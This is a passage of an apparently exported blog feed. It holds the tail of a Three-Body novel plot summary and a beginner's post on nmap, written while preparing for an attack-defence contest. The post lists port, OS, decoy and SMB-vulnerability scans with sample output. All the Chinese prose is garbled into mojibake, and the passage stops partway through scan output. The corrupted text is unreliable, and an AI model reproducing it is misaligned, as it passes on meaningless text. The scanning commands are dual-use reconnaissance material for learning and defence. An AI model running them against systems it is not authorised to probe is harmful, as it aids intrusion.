´è£‚ï¼Œç ´è£‚åçš„æ­»çº¿ä¼šå½¢æˆä½å…‰é€Ÿå¸¦ï¼Œæˆä¸ºé»‘åŸŸã€‚åœ¨è¿™ç‰‡åŒºåŸŸé‡Œï¼Œå…‰ä¼šå˜å¾—éå¸¸æ…¢ã€‚å…³ä¸€å¸†çœ‹åˆ°è¿™ä¸€åœºæ™¯ï¼Œè¿å¿™å¸¦ç€ç¨‹å¿ƒé£å›è“æ˜Ÿï¼Œåœ¨è¿”å›çš„è¿‡ç¨‹ä¸­ï¼Œäº¨åˆ©å·æ”¶åˆ°äº†AAçš„é€šè®¯ï¼ŒAAæ¿€åŠ¨åœ°å‘Šè¯‰ç¨‹å¿ƒï¼Œäº‘å¤©æ˜æ¥äº†ï¼Œç°åœ¨å°±åœ¨è“æ˜Ÿä¸Šï¼Œæˆ‘å»æ‰¾ä»–è¿‡æ¥å’Œä½ è¯´è¯ã€‚ä¸ºäº†ä¿è¯é€šè®¯å®‰å…¨ï¼Œä¸è¢«å‘¨å›´çš„å¤–æ˜Ÿäººå‘ç°ã€‚ä¸ç”¨äº†ï¼Œæˆ‘ä»¬é©¬ä¸Šå°±å›å»ï¼Œéšæœºå…³æ‰äº†é€šè®¯ã€‚æ­£å½“ç¨‹å¿ƒä»–ä»¬è¦å›åˆ°è“æ˜Ÿæ—¶ï¼Œçªç„¶æ­»çº¿ç ´è£‚ï¼Œä»–ä¿©è¿›å…¥äº†æ—¶é—´çœŸç©ºã€‚åå…­å¤©åï¼Œç¨‹å¿ƒå’Œå…³ä¸€å¸†ï¼Œæ‰è„±ç¦»äº†é»‘åŸŸï¼Œå›åˆ°äº†è“æ˜Ÿã€‚åœ¨æ—¶é—´çœŸç©ºé‡Œè™½ç„¶åªè¿‡äº†16å¤©ï¼Œä½†æ­¤æ—¶ï¼Œè“æ˜Ÿä¸Šå·²ç»è¿‡äº†ä¸€åƒå…«ç™¾ä¹åä¸‡å¹´ã€‚</p><p>&emsp;&emsp;ç¨‹å¿ƒå¾ˆéš¾è¿‡ã€‚å› ä¸ºå¥¹æ°¸è¿œé”™è¿‡äº†äº‘å¤©æ˜ã€‚äºŒäººç”¨æ¢æµ‹å™¨å‘ç°äº†åˆ»åœ¨çŸ³å¤´ä¸Šå·¨å¤§æ— æ¯”çš„å‡ ä¸ªå­—ï¼Œä¸Šé¢å†™ç€ï¼Œæˆ‘ä»¬åº¦è¿‡äº†å¹¸ç¦çš„ä¸€ç”Ÿã€‚æˆ‘ä»¬é€ç»™ä½ ä»¬ä¸€ä¸ªå°å®‡å®™ï¼Œåœ¨é‡Œé¢èº²è¿‡åç¼©ï¼Œå»æ–°çš„ä¸–ç•Œã€‚</p><p>&emsp;&emsp;ä»–ä»¬å‘ç°äº†è¿™ä¸ªå°ç¤¼ç‰©ï¼Œè¿™æ˜¯ä¸€ä¸ªç”±å¾®äº®ç»†çº¿ç”»å‡ºæ¥çš„é—¨ï¼Œä¸¤äººç‰µç€æ‰‹ï¼Œä¸€åŒè¿›å…¥äº†è¿™æ‰‡é—¨ã€‚è¿™é‡Œæ˜¯ä¸€ä¸ªä¸€ç«‹æ–¹åƒç±³çš„å¾ªç¯ç©ºé—´ï¼Œå¦‚æœä½ ä»å¤´è·‘åˆ°å°¾ï¼Œä½ ä¼šå‘ç°ï¼Œè‡ªå·±åˆå›åˆ°äº†èµ·ç‚¹ã€‚åœ¨è¿™ä¸ªç©ºé—´é‡Œï¼Œæœ‰ä¸€ç‰‡ç¾ä¸½çš„ç”°å›­ã€‚ç”Ÿæ´»ç”¨å“ï¼Œä¸€åº”ä¿±å…¨ã€‚è¿™ç¯‡å°å¤©åœ°å°±æ˜¯äº‘å¤©æ˜é€ç»™ç¨‹å¿ƒçš„ç¬¬äºŒä»¶ç¤¼ç‰©ï¼Œä¸€ä¸ªå°å®‡å®™ã€‚ç¨‹å¿ƒåœ¨è¿™é‡Œçœ‹è§äº†è€æœ‹å‹ï¼Œæ™ºå­ã€‚å¥¹ç”¨çš„èº¯å£³è¿˜æ˜¯è·Ÿåœ°çƒä¸Šçš„å¤–å½¢ä¸€æ ·ã€‚æ™ºå­ï¼Œæ˜¯è¿™é‡Œçš„ç®¡å®¶ï¼Œæ™ºå­å¯¹ç¨‹å¿ƒè¯´ï¼Œå®‡å®™å¾ˆå¤§ï¼Œç”Ÿæ´»æ›´å¤§ï¼Œæˆ‘ä»¬çœŸçš„åˆç›¸ä¼šäº†ã€‚</p><p>&emsp;&emsp;æ™ºå­å‘Šè¯‰ä»–ä»¬ï¼Œè¿™é‡Œæ˜¯äº‘å¤©æ˜é€ç»™äºŒä½çš„ç¤¼ç‰©ï¼Œåœ¨è¿™ï¼Œæ—¶é—´ä¼šè¿‡å¾—éå¸¸æ…¢ï¼Œåªéœ€åœ¨è¿™å¾…ä¸Šåå¹´ï¼Œå¤–é¢çš„å®‡å®™ï¼Œå°±ä¼šé‡å¯ã€‚ç¨‹å¿ƒå’Œå…³ä¸€å¸†åœ¨è¿™å¼€å§‹äº†ç”œèœœçš„ç”Ÿæ´»ï¼Œæ™ºå­æˆä¸ºäº†ä»–ä¿©çš„è€å¸ˆã€‚æ•™ä»–ä»¬ä¸‰ä½“é‡Œçš„çŸ¥è¯†ï¼Œç”Ÿæ´»äº†è®¸ä¹…åï¼Œä»–ä»¬æ”¶åˆ°äº†ä¸€ä¸ªå¤§ç¥çº§æ–‡æ˜å‘å…¨å®‡å®™å¹¿æ’­çš„ä¿¡å·ï¼Œè¿™ä¸ªä¿¡å·åŒ…å«äº†ç™¾ä¸‡ç§è¯­è¨€ï¼Œéƒ½æ˜¯å¤§ç¥çº§æ–‡æ˜ï¼Œè®¤ä¸ºå€¼å¾—è¢«é€šçŸ¥çš„å¤–æ˜Ÿæ–‡æ˜ã€‚åœ¨è¿™ä¿¡æ¯ä¸­ï¼Œä»–ä»¬å‘ç°äº†äººç±»å’Œä¸‰ä½“äººçš„è¯­è¨€ã€‚å†…å®¹å¤§è‡´å¦‚ä¸‹ï¼Œè¯·æŠŠä½ ä»¬åˆ¶é€ çš„å°å®‡å®™å½’è¿˜åˆ°å¤§å®‡å®™ä¸­ï¼Œå¤§å®‡å®™å› ä¸ºä½ ä»¬å·èµ°çš„è´¨é‡ï¼Œå°†ä¼šåœ¨è†¨èƒ€ä¸­æ­»å»ã€‚å½’è¿˜å°å®‡å®™ï¼Œæ„å‘³ç€åœ¨é‡Œé¢çš„å±…ä½è€…è¦å›åˆ°å¤§å®‡å®™ä¸­ã€‚ç¨‹å¿ƒå’Œå…³ä¸€å¸†å†³å®šå½’è¿˜å°å®‡å®™è¿”å›å¤§å®‡å®™ä¸­ã€‚</p><p>&emsp;&emsp;æ™ºå­å¼€å§‹è´Ÿè´£å½’è¿˜å°å®‡å®™ï¼Œåœ¨è¿™ä¸ªå°å®‡å®™çš„åº•ä¸‹ï¼Œè—æœ‰ä¸€è‰˜å°å‹é£èˆ¹ï¼Œè¿™è‰˜é£èˆ¹æµ“ç¼©äº†ä¸‰ä½“ä¸–ç•Œæœ€å…ˆè¿›çš„æŠ€æœ¯ã€‚ç¨‹å¿ƒæ²¡æœ‰æŠŠè¿™ä¸ªå°å®‡å®™å…¨éƒ¨å½’è¿˜ï¼Œå¥¹åœ¨è¿™ç•™ä¸‹äº†äº”å…¬æ–¤ã€‚ç•™ä¸‹äº†ä¸€ä¸ªç”Ÿæ€çƒï¼Œé‡Œé¢å…»ç€å°é±¼ã€‚å¥¹å¸Œæœ›ï¼Œè¿™ä¸ªç©ºé—´é‡Œè¿˜èƒ½æœ‰ç”Ÿå‘½å­˜åœ¨ã€‚æ™ºå­å¯¹ä¸¤ä½æœ‹å‹è¯´åˆ°ï¼Œæ”¾å¿ƒï¼Œæˆ‘åœ¨ï¼Œä½ ä»¬å°±åœ¨ã€‚éšåï¼Œé£èˆ¹å¯åŠ¨ï¼Œé£å‘äº†æœªçŸ¥çš„å¤§å®‡å®™ã€‚</p><p>&emsp;&emsp;ä¸‰ä½“ç³»åˆ—çš„æ•´ä¸ªæ•…äº‹ï¼Œåˆ°æ­¤ç»“æŸäº†ã€‚ç¨‹å¿ƒè¿™ä¸€è¾ˆå­ï¼Œéƒ½åœ¨æ”€ç™»ä¸€é“è´£ä»»çš„é˜¶æ¢¯ï¼Œå°æ—¶å€™çš„å¥¹è´£ä»»æ˜¯å¥½å¥½å­¦ä¹ ï¼Œä¸è®©çˆ¸å¦ˆå¤±æœ›ï¼ŒåŠªåŠ›æˆä¸ºä¸€ä¸ªä¼˜ç§€çš„äººã€‚é•¿å¤§åï¼Œå¥¹è¦ä¸ºå·¥ä½œè´Ÿè´£ï¼Œä¸ºé˜¶æ¢¯è®¡åˆ’è´Ÿè´£ã€‚åæ¥äº‘å¤©æ˜é€ä¸ªå¥¹çš„ä¸€é¢—æ˜Ÿæ˜Ÿã€‚ä¿ƒä½¿å¥¹æˆä¸ºäº†æ‰§å‰‘äººï¼Œè¿™æ—¶çš„å¥¹è¦ä¸ºå…¨äººç±»è´Ÿè´£ã€‚åæ¥å¥¹çš„è´£ä»»å˜å¾—å¤æ‚èµ·æ¥ï¼Œæœ¬æ¥å¥¹æƒ³ç»™äººæ’ä¸Šå…‰é€Ÿé£è¡Œçš„ç¿…è†€ï¼Œå´ä¸å¾—ä¸åˆ¶æ­¢ã€‚æœ€åå¥¹è¦ä¸ºæ•´ä¸ªå®‡å®™è´Ÿè´£ï¼Œå½’è¿˜å±äºè‡ªå·±çš„å°å®‡å®™ã€‚</p><p>&emsp;&emsp;äººç±»ï¼Œåœ¨é¢å¯¹å³å°†åˆ°æ¥çš„é»‘æš—æ£®æ—æ‰“å‡»æ—¶ï¼Œç”±äºå—åˆ°é“å¾·æ·é”çš„é™åˆ¶ï¼Œåšå‡ºäº†å¾ˆå¤šå†³ç­–å¤±è¯¯ï¼Œå¯¼è‡´å¤ªé˜³ç³»ä¸å¤å­˜åœ¨ã€‚åªæœ‰ç¨‹å¿ƒä¸AAä»å¤ªé˜³ç³»é€ƒå‡ºã€‚ä¸‰ä½“ç³»åˆ—çš„æ•´ä¸ªæ•…äº‹ï¼Œå‘Šè¯‰äº†æˆ‘ä»¬ä¸€ä¸ªçœŸç†ã€‚åœ¨æµ©ç€šçš„å®‡å®™ä¸­ï¼Œæ°¸æ’çš„åªæœ‰æ­»ç¥ã€‚</p><h2 id="åŸè§†é¢‘é“¾æ¥"><a href="#åŸè§†é¢‘é“¾æ¥" class="headerlink" title="åŸè§†é¢‘é“¾æ¥:"></a>åŸè§†é¢‘é“¾æ¥:</h2><p><a href="https://www.weibo.com/tv/v/HFze2EH9A?fid=1034:4399060850003080" target="_blank" rel="noopener">https://www.weibo.com/tv/v/HFze2EH9A?fid=1034:4399060850003080</a></p>]]></content>
      
      
      <categories>
          
          <category> å°ä¹¦å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆé‡Nmap</title>
      <link href="/2019/07/22/nmap/"/>
      <url>/2019/07/22/nmap/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>åå¤©è¦å‚åŠ äººç”Ÿç¬¬ä¸€æ¬¡awdçº¿ä¸‹æ”»é˜²äº†ï¼Œä»Šå¤©èµ¶ç´§çªå‡»ä¸€ä¸‹ï¼Œå…ˆå­¦ä¹ ä¸€ä¸‹nmapçš„ä¸€äº›å¸¸è§„æ“ä½œ</p><h3 id="å¼•å…¥ï¼š"><a href="#å¼•å…¥ï¼š" class="headerlink" title="å¼•å…¥ï¼š"></a>å¼•å…¥ï¼š</h3><p><strong>1) è·å–è¿œç¨‹ä¸»æœºçš„ç³»ç»Ÿç±»å‹åŠå¼€æ”¾ç«¯å£</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nmap</span> -sS -P0 -sV -O <span class="symbol">&lt;target&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ &lt; target &gt; å¯ä»¥æ˜¯å•ä¸€ IP, æˆ–ä¸»æœºåï¼Œæˆ–åŸŸåï¼Œæˆ–å­ç½‘</p><p>-sS TCP SYN æ‰«æ (åˆç§°åŠå¼€æ”¾,æˆ–éšèº«æ‰«æ)<br>-P0 å…è®¸ä½ å…³é—­ ICMP pings.<br>-sV æ‰“å¼€ç³»ç»Ÿç‰ˆæœ¬æ£€æµ‹<br>-O å°è¯•è¯†åˆ«è¿œç¨‹æ“ä½œç³»ç»Ÿ</p><p>å…¶å®ƒé€‰é¡¹:</p><p>-A åŒæ—¶æ‰“å¼€æ“ä½œç³»ç»ŸæŒ‡çº¹å’Œç‰ˆæœ¬æ£€æµ‹<br>-v è¯¦ç»†è¾“å‡ºæ‰«ææƒ…å†µ.</p><p><strong>2) åˆ—å‡ºå¼€æ”¾äº†æŒ‡å®šç«¯å£çš„ä¸»æœºåˆ—è¡¨</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -p <span class="number">80</span> -oG â€“ <span class="number">192.168</span><span class="number">.1</span>.* | grep open</span><br></pre></td></tr></table></figure><p><strong>3) åœ¨ç½‘ç»œå¯»æ‰¾æ‰€æœ‰åœ¨çº¿ä¸»æœº</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sP</span> 192<span class="selector-class">.168</span><span class="selector-class">.0</span>.*</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä¹Ÿå¯ç”¨ä»¥ä¸‹å‘½ä»¤:</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>æŒ‡å®š subnet</p><p><strong>4) Ping æŒ‡å®šèŒƒå›´å†…çš„ IP åœ°å€</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span><span class="number">-254</span></span><br></pre></td></tr></table></figure><p><strong>5) åœ¨æŸæ®µå­ç½‘ä¸ŠæŸ¥æ‰¾æœªå ç”¨çš„ IP</strong></p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-T4</span> <span class="selector-tag">-sP</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.2</span><span class="selector-class">.0</span>/<span class="selector-tag">24</span> <span class="selector-tag">&amp;</span><span class="selector-tag">&amp;</span> <span class="selector-tag">egrep</span> â€œ<span class="selector-tag">00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span>â€³ /<span class="selector-tag">proc</span>/<span class="selector-tag">net</span>/<span class="selector-tag">arp</span></span><br></pre></td></tr></table></figure><p><strong>6) åœ¨å±€åŸŸç½‘ä¸Šæ‰«æ‰¾ Conficker è •è™«ç—…æ¯’</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PN -T4 -p139,<span class="number">445</span> -n -v â€“script=smb-check-vulns â€“script-args safe=<span class="number">1</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span><span class="number">-254</span></span><br></pre></td></tr></table></figure><p><strong>7) æ‰«æç½‘ç»œä¸Šçš„æ¶æ„æ¥å…¥ç‚¹ ï¼ˆrogue APsï¼‰.</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p1<span class="number">-85</span>,<span class="number">113</span>,<span class="number">443</span>,<span class="number">8080</span><span class="number">-8100</span> -T4 â€“min-hostgroup <span class="number">50</span> â€“max-rtt-timeout</span><br><span class="line"><span class="number">2000</span> â€“initial-rtt-timeout <span class="number">300</span> â€“max-retries <span class="number">3</span> â€“host-timeout <span class="number">20</span>m</span><br><span class="line">â€“max-scan-delay <span class="number">1000</span> -oA wapscan <span class="number">10.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">8</span></span><br></pre></td></tr></table></figure><p><strong>8 ) ä½¿ç”¨è¯±é¥µæ‰«ææ–¹æ³•æ¥æ‰«æä¸»æœºç«¯å£</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">nmap</span> <span class="selector-tag">-sS</span> 192<span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.10</span> <span class="selector-tag">-D</span> 192<span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.2</span></span><br></pre></td></tr></table></figure><p><strong>9) ä¸ºä¸€ä¸ªå­ç½‘åˆ—å‡ºåå‘DNSè®°å½•</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -R -sL <span class="number">209.85</span>.<span class="number">229.99</span>/<span class="number">27</span> | awk â€˜&#123;<span class="keyword">if</span>($3==â€<span class="keyword">not</span>â€)<span class="keyword">print</span>â€(â€œ$2â€³) <span class="keyword">no</span> PTRâ€;<span class="keyword">else</span> <span class="keyword">print</span>$3â€³ is â€œ$2&#125;â€™ | <span class="keyword">grep</span> â€˜(â€˜</span><br></pre></td></tr></table></figure><p><strong>10) æ˜¾ç¤ºç½‘ç»œä¸Šå…±æœ‰å¤šå°‘å° Linux åŠ Win è®¾å¤‡?</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -F -O <span class="number">192.168</span>.<span class="number">0.1</span>-<span class="number">255</span> | <span class="keyword">grep</span> â€œRunning: â€ &gt; <span class="regexp">/tmp/</span>os; echo â€œ$(cat <span class="regexp">/tmp/</span>os | <span class="keyword">grep</span> Linux \</span><br><span class="line">| wc -l) Linux device(s)â€; echo â€œ$(cat <span class="regexp">/tmp/</span>os | <span class="keyword">grep</span> Windows | wc -l) Window(s) deviceâ€</span><br></pre></td></tr></table></figure><p>### </p><h3 id="1-ç”¨ä¸»æœºåå’ŒIPåœ°å€æ‰«æç³»ç»Ÿ"><a href="#1-ç”¨ä¸»æœºåå’ŒIPåœ°å€æ‰«æç³»ç»Ÿ" class="headerlink" title="1. ç”¨ä¸»æœºåå’ŒIPåœ°å€æ‰«æç³»ç»Ÿ"></a>1. ç”¨ä¸»æœºåå’ŒIPåœ°å€æ‰«æç³»ç»Ÿ</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> server2.tecmint.<span class="keyword">com</span>ï¼ˆ<span class="number">192.168</span>.<span class="number">0.101</span>ï¼‰</span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">15</span>:<span class="number">42</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.415</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="2-æ‰«æä½¿ç”¨â€œ-vâ€é€‰é¡¹"><a href="#2-æ‰«æä½¿ç”¨â€œ-vâ€é€‰é¡¹" class="headerlink" title="2.æ‰«æä½¿ç”¨â€œ-vâ€é€‰é¡¹"></a>2.æ‰«æä½¿ç”¨â€œ-vâ€é€‰é¡¹</h3><p>ä½ å¯ä»¥çœ‹åˆ°ä¸‹é¢çš„å‘½ä»¤ä½¿ç”¨â€œ <strong>-</strong>v â€œé€‰é¡¹åç»™å‡ºäº†è¿œç¨‹æœºå™¨æ›´è¯¦ç»†çš„ä¿¡æ¯ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -v server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">15</span>:<span class="number">43</span> EST</span><br><span class="line">Initiating ARP Ping Scan against <span class="number">192.168</span>.<span class="number">0.101</span> [<span class="number">1</span> port] at <span class="number">15</span>:<span class="number">43</span></span><br><span class="line">The ARP Ping Scan took <span class="number">0.01</span>s <span class="keyword">to</span> scan <span class="number">1</span> total hosts.</span><br><span class="line">Initiating SYN Stealth Scan against server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>) [<span class="number">1680</span> ports] at <span class="number">15</span>:<span class="number">43</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">22</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">80</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">8888</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">111</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">3306</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">957</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">The SYN Stealth Scan took <span class="number">0.30</span>s <span class="keyword">to</span> scan <span class="number">1680</span> total ports.</span><br><span class="line">Host server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>) appears <span class="keyword">to</span> <span class="keyword">be</span> <span class="keyword">up</span> ... good.</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.485</span> seconds</span><br><span class="line">               Raw packets sen<span class="variable">t:</span> <span class="number">1681</span> (<span class="number">73.962</span>KB) | Rcvd: <span class="number">1681</span> (<span class="number">77.322</span>KB)</span><br></pre></td></tr></table></figure><h3 id="3-æ‰«æå¤šå°ä¸»æœº"><a href="#3-æ‰«æå¤šå°ä¸»æœº" class="headerlink" title="3.æ‰«æå¤šå°ä¸»æœº"></a>3.æ‰«æå¤šå°ä¸»æœº</h3><p>ä½ å¯ä»¥ç®€å•çš„åœ¨Nmapå‘½ä»¤ååŠ ä¸Šå¤šä¸ªIPåœ°å€æˆ–ä¸»æœºåæ¥æ‰«æå¤šå°ä¸»æœºã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0.101</span> <span class="number">192.168</span>.<span class="number">0.102</span> <span class="number">192.168</span>.<span class="number">0.103</span> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">06</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line">Nmap finished: <span class="number">3</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.580</span> seconds</span><br></pre></td></tr></table></figure><h3 id="4-æ‰«ææ•´ä¸ªå­ç½‘"><a href="#4-æ‰«ææ•´ä¸ªå­ç½‘" class="headerlink" title="4.æ‰«ææ•´ä¸ªå­ç½‘ *"></a>4.æ‰«ææ•´ä¸ªå­ç½‘ *</h3><p>ä½ å¯ä»¥ä½¿ç”¨*é€šé…ç¬¦æ¥æ‰«ææ•´ä¸ªå­ç½‘æˆ–æŸä¸ªèŒƒå›´çš„IPåœ°å€ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0</span>.*</span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> 